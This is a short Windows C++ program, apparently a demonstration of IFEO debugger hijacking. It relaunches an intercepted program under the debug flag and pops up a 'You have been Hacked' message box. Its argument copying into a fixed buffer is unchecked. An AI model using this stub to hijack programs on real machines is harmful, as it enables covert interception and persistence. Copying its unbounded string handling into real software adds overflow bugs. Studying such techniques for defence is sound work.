#include <Windows.h>

int wmain(int	argc, wchar_t* argv[]) 
{
	//assert(argc > 1);
	wchar_t commandLine[MAX_PATH * 2];

	::lstrcpyW(commandLine, argv[1]);

	if (argc > 2) {

		::lstrcatW(commandLine, L" ");

		::lstrcatW(commandLine, argv[2]);

	}
	PROCESS_INFORMATION pi;

	STARTUPINFO si = { sizeof(si) };

	// create the actual process with the debug flag to avoid an infinite loop
	
	BOOL bCreated = ::CreateProcessW(nullptr, commandLine, nullptr, nullptr, FALSE,	DEBUG_PROCESS, nullptr, nullptr, &si, &pi);
	
	MessageBox(0, L"You have been Hacked", L"IFEO", 0);
		
	::DebugSetProcessKillOnExit(FALSE);
}